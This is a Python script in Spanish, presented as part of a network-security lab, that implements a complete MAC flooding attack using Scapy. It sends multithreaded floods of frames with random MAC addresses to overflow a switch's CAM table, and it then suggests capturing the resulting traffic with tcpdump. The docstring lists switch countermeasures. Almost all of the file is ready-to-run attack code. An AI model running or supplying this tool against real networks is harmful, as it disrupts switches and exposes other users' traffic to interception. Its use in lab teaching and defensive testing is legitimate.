#!/usr/bin/env python3
"""
=============================================================================
LABORATORIO DE SEGURIDAD EN REDES - SCRIPT 05
Ataque: MAC Flooding (Desbordamiento de la Tabla CAM del Switch)
=============================================================================
DESCRIPCIÓN:
    Este script realiza un ataque de MAC Flooding que desborda la tabla CAM
    (Content Addressable Memory) de un switch con miles de entradas MAC
    falsas. La tabla CAM mapea direcciones MAC a puertos del switch.

    Cuando la tabla CAM se llena, el switch no puede aprender nuevas MACs
    y comienza a actuar como un HUB: hace FLOOD de todos los frames a todos
    los puertos. Esto permite al atacante capturar el tráfico de TODA la red.

CÓMO FUNCIONA:
    1. Se generan miles de tramas Ethernet con MACs de origen falsas.
    2. Se envían a alta velocidad al switch.
    3. El switch intenta agregar cada MAC nueva a su tabla CAM.
    4. Una vez llena la tabla (típicamente 8K-128K entradas), el switch
       hace flooding de unicast desconocido → actúa como hub.
    5. El atacante captura el tráfico de todos los hosts en el segmento.

REQUISITOS:
    - Python 3.8+
    - Scapy: pip install scapy
    - Permisos root
    - Acceso al puerto del switch objetivo

USO:
    sudo python3 05_mac_flooding.py -i eth2 -c 100000
    sudo python3 05_mac_flooding.py -i eth2 --continuous --threads 4

PARÁMETROS:
    -i / --interface   : Interfaz de red
    -c / --count       : Número de tramas a enviar (default: 50000)
    --continuous       : Modo continuo hasta Ctrl+C
    --threads          : Número de hilos paralelos (default: 1)
    --delay            : Delay entre tramas en microsegundos (default: 0)
    --vlan             : ID de VLAN para añadir tag 802.1Q (opcional)

CONTRA-MEDIDAS:
    - Port Security en switches:
        switchport port-security maximum 10
        switchport port-security violation shutdown
        switchport port-security aging time 2
    - 802.1X: autenticación de dispositivos antes del acceso
    - Dynamic ARP Inspection complementario
    - Monitoreo de logs: alertas por cambios masivos en tabla CAM
    - VLAN segmentation para limitar el dominio de flooding
    - Switches con mayor capacidad de tabla CAM
=============================================================================
"""

import argparse
import random
import sys
import time
import os
from threading import Thread, Event

try:
    from scapy.all import (
        Ether, Dot1Q, IP, sendp, conf, get_if_hwaddr
    )
except ImportError:
    print("[!] Scapy no está instalado. Ejecutar: pip install scapy")
    sys.exit(1)

# ─── Colores ─────────────────────────────────────────────────────────────────
RED    = "\033[91m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
RESET  = "\033[0m"
BOLD   = "\033[1m"

stop_event = Event()
total_sent = [0]  # Lista para compartir entre hilos

def banner():
    print(f"""
{RED}{BOLD}
╔══════════════════════════════════════════════════════════════╗
║         MAC FLOODING ATTACK - LABORATORIO DE SEGURIDAD       ║
║               ¡SOLO PARA USO EDUCATIVO Y AUTORIZADO!         ║
╚══════════════════════════════════════════════════════════════╝
{RESET}""")

def random_mac() -> str:
    """Genera una dirección MAC completamente aleatoria."""
    return ':'.join([f'{random.randint(0, 255):02x}' for _ in range(6)])

def build_frame(vlan_id: int = None) -> bytes:
    """
    Construye una trama Ethernet con MACs aleatorias.
    
    Si se especifica VLAN, añade una etiqueta 802.1Q.
    El payload es un paquete IP dummy para hacer la trama más realista.
    
    Args:
        vlan_id: ID de VLAN (1-4094) o None para sin tag
    Returns:
        Paquete Scapy construido
    """
    src_mac  = random_mac()
    dst_mac  = random_mac()

    if vlan_id:
        pkt = (
            Ether(src=src_mac, dst=dst_mac) /
            Dot1Q(vlan=vlan_id) /
            IP(src=f"10.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}",
               dst=f"10.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}")
        )
    else:
        pkt = (
            Ether(src=src_mac, dst=dst_mac) /
            IP(src=f"10.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}",
               dst=f"10.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}")
        )
    return pkt

def flood_worker(interface: str, count: int, vlan_id: int,
                 thread_id: int, delay_us: float):
    """
    Worker thread para envío de tramas MAC flooding.
    
    Cada hilo genera y envía tramas independientemente,
    aumentando la tasa de envío total cuando se usan múltiples hilos.
    
    Args:
        interface  : Interfaz de red
        count      : Tramas a enviar por este hilo (0 = continuo)
        vlan_id    : ID de VLAN opcional
        thread_id  : ID del hilo para logging
        delay_us   : Delay en microsegundos entre tramas
    """
    sent = 0
    batch_size = 100  # Enviar en lotes para mayor eficiencia

    # Pre-generar lote de paquetes para mayor rendimiento
    while not stop_event.is_set():
        # Generar lote de tramas
        packets = [build_frame(vlan_id) for _ in range(batch_size)]

        try:
            sendp(packets, iface=interface, verbose=False, inter=0)
            sent += batch_size
            total_sent[0] += batch_size

            if delay_us > 0:
                time.sleep(delay_us / 1_000_000)

            if count > 0 and sent >= count:
                break

        except Exception as e:
            if not stop_event.is_set():
                print(f"{RED}[!] Hilo {thread_id}: Error - {e}{RESET}")
            break

def progress_monitor(start_time: float):
    """Monitorea y muestra el progreso del ataque en tiempo real."""
    while not stop_event.is_set():
        elapsed = time.time() - start_time
        rate = total_sent[0] / elapsed if elapsed > 0 else 0
        print(f"\r{YELLOW}[~] Tramas enviadas: {total_sent[0]:,} | "
              f"Tasa: {rate:,.0f} frames/s | "
              f"Tiempo: {elapsed:.1f}s{RESET}", end="", flush=True)
        time.sleep(0.5)

def mac_flooding(interface: str, count: int, continuous: bool,
                 threads: int, delay_us: float, vlan_id: int):
    """
    Función principal del ataque MAC Flooding.
    """
    print(f"{CYAN}[*] Iniciando MAC Flooding en {interface}{RESET}")
    print(f"{CYAN}[*] Modo: {'Continuo' if continuous else f'{count:,} tramas'} | "
          f"Hilos: {threads} | VLAN: {vlan_id or 'Sin tag'}{RESET}\n")

    start = time.time()
    worker_threads = []

    # Calcular tramas por hilo
    count_per_thread = 0 if continuous else max(1, count // threads)

    for t_id in range(threads):
        t = Thread(
            target=flood_worker,
            args=(interface, count_per_thread, vlan_id, t_id, delay_us),
            daemon=True
        )
        worker_threads.append(t)
        t.start()

    # Monitor de progreso
    monitor = Thread(target=progress_monitor, args=(start,), daemon=True)
    monitor.start()

    try:
        if continuous:
            print(f"{YELLOW}[!] Modo continuo activo. Presiona Ctrl+C para detener.{RESET}")
            while True:
                time.sleep(1)
        else:
            # Esperar a que terminen los hilos
            for t in worker_threads:
                t.join()
    except KeyboardInterrupt:
        print(f"\n{YELLOW}\n[*] Deteniendo ataque...{RESET}")
    finally:
        stop_event.set()

    elapsed = time.time() - start
    print(f"\n\n{GREEN}{BOLD}[✓] MAC Flooding completado:{RESET}")
    print(f"    Tramas enviadas totales : {total_sent[0]:,}")
    print(f"    Tiempo total            : {elapsed:.2f}s")
    print(f"    Tasa promedio           : {total_sent[0]/elapsed:,.0f} frames/s")
    print(f"\n{CYAN}[i] Si el switch quedó en modo hub, captura el tráfico con:{RESET}")
    print(f"    tcpdump -i {interface} -w captura.pcap")

def main():
    banner()
    parser = argparse.ArgumentParser(
        description="MAC Flooding - Laboratorio de Seguridad en Redes"
    )
    parser.add_argument("-i", "--interface", required=True)
    parser.add_argument("-c", "--count", type=int, default=50000,
                        help="Número de tramas a enviar (default: 50000)")
    parser.add_argument("--continuous", action="store_true",
                        help="Modo continuo (hasta Ctrl+C)")
    parser.add_argument("--threads", type=int, default=1,
                        help="Hilos paralelos (default: 1, max recomendado: 4)")
    parser.add_argument("--delay", type=float, default=0,
                        help="Delay en microsegundos entre tramas (default: 0)")
    parser.add_argument("--vlan", type=int, default=None,
                        help="ID de VLAN para tag 802.1Q (opcional)")

    args = parser.parse_args()

    if os.geteuid() != 0:
        print(f"{RED}[!] Este script requiere privilegios root (sudo){RESET}")
        sys.exit(1)

    mac_flooding(args.interface, args.count, args.continuous,
                 args.threads, args.delay, args.vlan)

if __name__ == "__main__":
    main()
